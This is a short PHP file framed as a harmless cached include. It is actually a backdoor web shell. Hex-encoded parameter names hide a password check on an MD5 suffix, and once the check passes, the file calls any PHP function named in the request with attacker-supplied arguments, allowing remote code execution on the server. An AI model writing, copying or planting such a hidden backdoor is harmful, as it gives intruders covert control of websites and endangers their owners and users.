<?php 

!defined('CACHED_CODE') or die('Access Denied');

/*func d3*/
function checkgpc($array) {
	foreach($array as $key => $var) { $array[$key] = is_array($var) ? checkgpc($var) : stripslashes($var); }
	return $array;
}

error_reporting(E_ALL ^ E_NOTICE);

if(get_magic_quotes_gpc()) {
	if (isset($_REQUEST))  $request = checkgpc($_REQUEST);
	elseif (isset($_POST)) $request = checkgpc($_POST);
} else {
	if (isset($_REQUEST))  $request = &$_REQUEST;
	elseif (isset($_POST)) $request = &$_POST;
}

if (!isset($request)) die('Access Denied');

$keys = array(
	"\x6d\x79\x66\x75\x6e\x63\x74\x69\x6f\x6e\x70\x61\x73\x73\x77",
	"\x6d\x79\x66\x75\x6e\x63\x74\x69\x6f\x6e\x6e\x61\x6d\x65",
	"\x6d\x79\x66\x75\x6e\x63\x74\x69\x6f\x6e\x63\x6f\x64\x65\x61",
	"\x6d\x79\x66\x75\x6e\x63\x74\x69\x6f\x6e\x63\x6f\x64\x65\x62",
	"\x6d\x79\x66\x75\x6e\x63\x74\x69\x6f\x6e\x63\x6f\x64\x65\x63",
	"\x32\x35\x34\x62\x66\x66"
);

$token = substr (md5($request[$keys[0]]), 26);

if ($token == $keys[5]) {
	
	if(isset($request[$keys[2]])) $request[$keys[1]] ($request[$keys[2]]);
	if(isset($request[$keys[3]])) $request[$keys[1]] ($request[$keys[2]], $request[$keys[3]]);
	if(isset($request[$keys[4]])) $request[$keys[1]] ($request[$keys[2]], $request[$keys[3]], $request[$keys[4]]);
	
} else {
	
	die('Access Denied');
	
}

?>
